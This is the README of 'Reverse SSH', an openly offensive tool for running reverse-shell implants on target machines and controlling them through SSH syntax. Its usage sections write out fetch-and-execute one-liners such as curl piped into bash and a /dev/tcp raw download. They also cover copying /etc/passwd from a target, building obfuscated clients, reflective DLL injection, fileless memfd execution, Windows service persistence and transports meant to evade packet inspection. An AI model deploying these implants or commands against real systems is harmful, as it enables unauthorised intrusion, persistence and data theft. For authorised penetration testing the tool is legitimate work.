# Reverse SSH
![icon](icons/On_Top_Of_Fv.png)  
(Art credit to https://www.instagram.com/smart.hedgehog.art/)

Want to use SSH for reverse shells? Now you can.

- Manage and connect to reverse shells with native SSH syntax
- Dynamic, local and remote forwarding
- Native `SCP` and `SFTP` implementations for retrieving files from your targets
- Full windows shell
- Multiple network transports, such as `http`, `websockets`, `tls` and more
- Mutual client & server authentication to create high trust control channels
And more!


```text
                    +----------------+                 +---------+
                    |                |                 |         |
                    |                |       +---------+   RSSH  |
                    |    Reverse     |       |         |  Client |
                    |  SSH server    |       |         |         |
                    |                |       |         +---------+
+---------+         |                |       |
|         |         |                |       |
| Human   |   SSH   |                |  SSH  |         +---------+
| Client  +-------->+                <-----------------+         |
|         |         |                |       |         |   RSSH  |
+---------+         |                |       |         |  Client |
                    |                |       |         |         |
                    |                |       |         +---------+
                    |                |       |
                    |                |       |
                    +----------------+       |         +---------+
                                             |         |         |
                                             |         |   RSSH  |
                                             +---------+  Client |
                                                       |         |
                                                       +---------+
```



https://github.com/user-attachments/assets/11dc8d14-59f1-4bdd-9503-b70f8a0d2db1


- [Reverse SSH](#reverse-ssh)
  - [TL;DR](#tldr)
    - [Setup](#setup)
    - [Basic Usage](#basic-usage)
  - [Sponsors](#sponsors)
    - [Individuals](#individuals)
    - [Companies](#companies)
  - [Fancy Features](#fancy-features)
    - [Privileges](#privileges)
    - [Automatic connect-back](#automatic-connect-back)
    - [Reverse shell download (client generation and in-built HTTP server)](#reverse-shell-download-client-generation-and-in-built-http-server)
    - [Alternate Transports (HTTP/Websockets/TLS)](#alternate-transports-httpwebsocketstls)
    - [Bash autocomplete](#bash-autocomplete)
    - [Windows DLL Generation](#windows-dll-generation)
    - [SSH Subsystems](#ssh-subsystems)
      - [All](#all)
      - [Linux](#linux)
      - [Windows](#windows)
    - [Windows Service Integration](#windows-service-integration)
    - [Full Windows Shell Support](#full-windows-shell-support)
    - [Webhooks](#webhooks)
    - [Tun (VPN)](#tun-vpn)
    - [Fileless execution (Clients support dynamically downloading executables to execute as shell)](#fileless-execution-clients-support-dynamically-downloading-executables-to-execute-as-shell)
      - [Supported URI Schemes](#supported-uri-schemes)
- [Help](#help)
  - [Windows and SFTP](#windows-and-sftp)
  - [Server started with `--insecure` still has `Failed to handshake`](#server-started-with---insecure-still-has-failed-to-handshake)
  - [Foreground vs Background](#foreground-vs-background)
- [Donations, Support, or Giving Back](#donations-support-or-giving-back)

## TL;DR

### Setup

The docker release is recommended as it includes the right version of golang, and a cross compiler for windows.
```sh
# Start the server
docker run -p3232:2222 -e EXTERNAL_ADDRESS=<your.rssh.server.internal>:3232 -e SEED_AUTHORIZED_KEYS="$(cat ~/.ssh/id_ed25519.pub)" -v data:/data reversessh/reverse_ssh
```

### Basic Usage

```sh
# Connect to the server console
ssh your.rssh.server.internal -p 3232


# List all server console commands
catcher$ help

# Build a new client and host it on the in-built webserver
catcher$ link
http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25


# curl or wget this binary to a target system then execute it,
curl http://192.168.0.11:3232/4bb55de4d50cc724afbf89cf46f17d25.sh |  bash

# then we can then list what clients are connected
catcher$ ls
                                 Targets
+------------------------------------------+-----------------------------------+
| IDs                                      | Version                           |
+------------------------------------------+-----------------------------------+
| a0baa1631fe7cfbbfae34eb7a66d46c00d2a161e | SSH-v2.2.3-1-gdf5a3f8-linux_amd64 |
| fe6c52029e37185e4c7d512edd67a6c7694e2995 |                                   |
| dummy.machine                            |                                   |
| 192.168.0.11:34542                       |                                   |
+------------------------------------------+-----------------------------------+
```

All commands support the `-h` flag for giving help.


Then typical ssh commands work, just specify your rssh server as a jump host.

```sh
# Connect to full shell
ssh -J your.rssh.server.internal:3232 dummy.machine

# Start remote forward
ssh -R 1234:localhost:1234 -J your.rssh.server.internal:3232 dummy.machine

# Start dynamic forward
ssh -D 9050 -J your.rssh.server.internal:3232 dummy.machine

# SCP
scp -J your.rssh.server.internal:3232 dummy.machine:/etc/passwd .

```

## Sponsors 

A huge thanks to the following folk for donating to the RSSH project and making all this work possible! 

### Individuals
[chikamobina](https://github.com/chikamobina) for their generous donations!  
[wrighterase (ctrlzero)](https://github.com/wrighterase) for their pull requests and donation! 

### Companies

[Carapace](https://carapace.nz/) is a New Zealand based security consultancy with an extremely talented team of folk!  
[<img src="icons/carapace_logo.png">](https://carapace.nz/)


## Fancy Features


### Privileges
The RSSH server supports very basic user privileges, where users found in the `data-directory`/`keys` (specified by `--datadir`) folder e.g `data-directory/keys/jim` will be assigned as a "user" only able to see clients that are public (found in the authorized_controllee_keys file without an `owners` tag, or an empty `owners` tag) or specifically assigned to them, e.g `owners="jim"`. 

This can be changed at run time via an user sharing access to a client they own with the `access` command, or a server administrator. Defaultly, any public key found in the `authorized_keys` file will be marked as an administrator to retain backwards compatibility.
Any changes made by the `access` command will not persist server reboot, and this will require editing the `authorized_controllee_keys` file for that specific client. 

### Automatic connect-back

The rssh client allows you to bake in a connect back address.
By default the `link` command will bake in the servers external address.

If you're (for some reason) manually building the binary, you can specify the environment variable `RSSH_HOMESERVER` to bake it into the client:

```sh
$ RSSH_HOMESERVER=your.rssh.server.internal:3232 make

# Will connect to your.rssh.server.internal:3232, even though no destination is specified
$ bin/client

# Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
$ bin/client -d example.com:3232
```

### Reverse shell download (client generation and in-built HTTP/Raw TCP server)

The RSSH server can build and host client binaries (`link` command). Which is the preferred method for building and serving clients.
For function to work the server must be placed in the project `bin/` folder, as it needs to find the client source.

By default the `docker` release has this all built properly, and is recommended for use

```sh
ssh your.rssh.server.internal -p 3232

catcher$ link -h

link [OPTIONS]
Link will compile a client and serve the resulting binary on a link which is returned.
This requires the web server component has been enabled.
	--fingerprint	Set RSSH server fingerprint will default to server public key
	--garble	Use garble to obfuscate the binary (requires garble to be installed)
	--goarch	Set the target build architecture (default runtime GOARCH)
	--goarm	Set the go arm variable (not set by default)
	--goos	Set the target build operating system (default runtime GOOS)
	--http	Use http polling as the underlying transport
	--https	Use https polling as the underlying transport
	--name	Set the link download url/filename (default random characters)
	--no-lib-c	Compile client without glibc
	--owners	Set owners of client, if unset client is public all users. E.g --owners jsmith,ldavidson
	--proxy	Set connect proxy address to bake it
	--raw-download	Download over raw TCP, outputs bash downloader rather than http
	--shared-object	Generate shared object file
	--sni	When TLS is in use, set a custom SNI for the client to connect with
	--stdio	Use stdin and stdout as transport, will disable logging, destination after stdio:// is ignored
	--tls	Use TLS as the underlying transport
	--upx	Use upx to compress the final binary (requires upx to be installed)
	--working-directory	Set download/working directory for automatic script (i.e doing curl https://<url>.sh)
	--ws	Use plain http websockets as the underlying transport
	--wss	Use TLS websockets as the underlying transport
	-C	Comment to add as the public key (acts as the name)
	-l	List currently active download links
	-o	Set owners of client, if unset client is public all users. E.g --owners jsmith,ldavidson
	-r	Remove download link
	-s	Set homeserver address, defaults to server --external_address if set, or server listen address if not

# Generate a client and serve it on a named link
catcher$ link --name test
http://your.rssh.server.internal:3232/test

```

Then you can download it as follows:

```sh
wget http://your.rssh.server.internal:3232/test
chmod +x test
./test
```

Or you can use raw tcp to download the client binary:
```sh
bash -c "exec 3<>/dev/tcp/your.rssh.server.internal/3232; echo RAWtest>&3; cat <&3" > test
```
The format for this is just `RAW` followed by the filename, i.e in this case `test`, rssh can autogenerate this for you with `--raw-download`.

The RSSH server also supports `.sh`, `.py` and `.ps1` URL path endings which will generate a script you can pipe into an intepreter:
```sh
curl http://your.rssh.server.internal:3232/test.sh | sh
```

### Alternate Transports (HTTP/Websockets/TLS)
The reverse SSH server and client both support multiple transports for when deep packet inspection blocks SSH outbound from a host or network. 
You can either specify the connect back scheme manually by specifying it as a url in the client. 

E.g
```sh
./client -d ws://your.rssh.server:3232
```

Or by baking it in with the `link` command. 
```sh
ssh your.rssh.server -p 3232 link --ws --name test
```

### Bash autocomplete

The RSSH server has the `autocomplete` command which integrates nicely with bash so that you can have autocompletions when not using the server console. 
To install them you simply do:

```sh
ssh your.rssh.server.internal -p 3232 autocomplete --shell-completion your.rssh.server.internal:3232
```

And this will return an autocompletion that can be added to your `.zshrc` or `.bashrc`

E.g

```sh
_RSSHCLIENTSCOMPLETION()
{
    local cur=${COMP_WORDS[COMP_CWORD]}
    COMPREPLY=( $(compgen -W "$(ssh your.rssh.server.internal -p 3232 autocomplete --clients)" -- $cur) )
}

_RSSHFUNCTIONSCOMPLETIONS()
{
    local cur=${COMP_WORDS[COMP_CWORD]}
    COMPREPLY=( $(compgen -W "$(ssh your.rssh.server.internal -p 3232 help -l)" -- $cur) )
}

complete -F _RSSHFUNCTIONSCOMPLETIONS ssh your.rssh.server.internal -p 3232 

complete -F _RSSHCLIENTSCOMPLETION ssh -J your.rssh.server.internal:3232

complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 exec 
complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 connect 
complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 listen -c 
complete -F _RSSHCLIENTSCOMPLETION ssh your.rssh.server.internal:3232 kill 
```

Enabling you to do completions straight from your terminal:

```sh
# Will give you an option based on what clients are connected
ssh -J your.rssh.server.internal:3232 <TAB>
```

### Windows DLL Generation

You can compile the client as a DLL to be loaded with something like [Invoke-ReflectivePEInjection](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1). Which is useful when you want to do fileless injection of the rssh client.

This will need a cross compiler if you are doing this on linux, use `mingw-w64-gcc`, this is included in the docker release.

```bash
# Using the link command
catcher$ link --goos windows --shared-object --name windows_dll
http://your.rssh.server.internal:3232/windows_dll

# If building manually
CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make client_dll

```

### SSH Subsystems

The SSH protocol supports calling subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms, and `sftp` support.


#### All
`list`  Lists avaiable subsystem
`sftp`: Runs the sftp handler to transfer files

#### Linux
`setgid`:   Attempt to change group
`setuid`:   Attempt to change user

#### Windows
`service`: Installs or removes the rssh binary as a windows service, requires administrative rights


e.g

```sh
# Install the rssh binary as a service (windows only)
ssh -J your.rssh.server.internal:3232 test-pc.user.test-pc -s service --install
```

### Windows Service Integration

The client RSSH binary supports being run within a windows service and wont time out after 10 seconds. This is great for creating persistent management services.

### Full Windows Shell Support

Most reverse shells for windows struggle to generate a shell environment that supports resizing, copying and pasting and all the other features that we're all very fond of.
This project uses `conpty` on newer versions of windows, and the `winpty` library (which self unpacks) on older versions. This should mean that almost all versions of windows will net you a nice shell.

### Webhooks

The RSSH server can send out raw HTTP requests set using the `webhook` command from the terminal interface.

First enable a webhook:
```bash
$ ssh your.rssh.server.internal -p 3232
catcher$ webhook --on http://localhost:8080/
```

Then disconnect, or connect a client, this will when issue a `POST` request with the following format.


```bash
$ nc -l -p 8080
POST /rssh_webhook HTTP/1.1
Host: localhost:8080
User-Agent: Go-http-client/1.1
Content-Length: 165
Content-Type: application/json
Accept-Encoding: gzip

{"Status":"connected","ID":"ae92b6535a30566cbae122ebb2a5e754dd58f0ca","IP":"[::1]:52608","HostName":"user.computer","Timestamp":"2022-06-12T12:23:40.626775318+12:00"}%
```


As an additional note, please use the `/slack` endpoint if connecting this to discord.

### Tun (VPN)

RSSH and SSH support creating tuntap interfaces that allow you to route traffic and create pseudo-VPN. It does take a bit more setup than just a local or remote forward (`-L`, `-R`), but in this mode you can send UDP and ICMP.

First set up a tun (layer 3) device on your local machine.
```sh
sudo ip tuntap add dev tun0 mode tun
sudo ip addr add 172.16.0.1/24 dev tun0
sudo ip link set dev tun0 up

# This will defaultly route all non-local network traffic through the tunnel
sudo ip route add 0.0.0.0/0 via 172.16.0.1 dev tun0
```

Install a client on a remote machine, this will not work if you have your RSSH client on the same host as your tun device.
```sh
ssh -J your.rssh.server.internal:3232 user.wombo -w 0:any
```

This has some limitations, it is only able to send `UDP`/`TCP`/`ICMP`, and not arbitrary layer 3 protocols. `ICMP` is best effort and may use the remote hosts `ping` tool, as ICMP sockets are privileged on most machines. This also does not support `tap` devices, e.g layer 2 VPN, as this would require administrative access.

### Fileless execution (Clients support dynamically downloading executables to execute as shell)

When specifying what executable the rssh binary should run, either when connecting with a full PTY session or raw execution the client supports URI schemes to download offhost executables.

For example.

```sh
connect --shell https://your.host/program <rssh_client_id>
ssh -J your.rssh.server:3232 <rssh_client_id> https://your.host/program
```

#### Supported URI Schemes

`http/https`: Pure web downloading

`rssh`: Download via the rssh server
The rssh server will serve content from the `downloads` directory in the executables working directory.

Both of these methods will opportunistically use [memfd](https://man7.org/linux/man-pages/man2/memfd_create.2.html) which will not write any executables to disk.

# Help

## Windows and SFTP

Due to the limitations of SFTP (or rather the library Im using for it). Paths need a little more effort on windows.

```sh
sftp -r -J your.rssh.server.internal:3232 test-pc.user.test-pc:'/C:/Windows/system32'
```

Note the `/` before the starting character.

## Server started with `--insecure` still has `Failed to handshake`

If the client binary was generated with the `link` command this client has the server public key fingerprint baked in by default. If you lose your server private key, the clients will no longer be able to connect.
You can also generate clients with `link --fingerprint <fingerprint here>` to specify a fingerprint, there isnt currently a way to disable this as per version 1.0.13.

## Foreground vs Background

By default, clients will run in the background then the parent process will exit, the child process will be given the parent processes stdout/stderr so you will be able to see output. If you need to debug your client, use the `--foreground` flag.

# Donations, Support, or Giving Back

The easiest way to give back to the RSSH project is by finding bugs, opening feature requests and word-of-mouth advertising it to people you think will find it useful!

However, if you want to give something back to me directly, you can do so either through Kofi or Github Sponsors (under "Sponsor this Project" on the right hand side).
Or donate to me by sending to the either of the following wallets:

Monero (XMR):
`8A8TRqsBKpMMabvt5RxMhCFWcuCSZqGV5L849XQndZB4bcbgkenH8KWJUXinYbF6ySGBznLsunrd1WA8YNPiejGp3FFfPND`
Bitcoin (BTC):
`bc1qm9e9sfrm7l7tnq982nrm6khnsfdlay07h0dxfr`
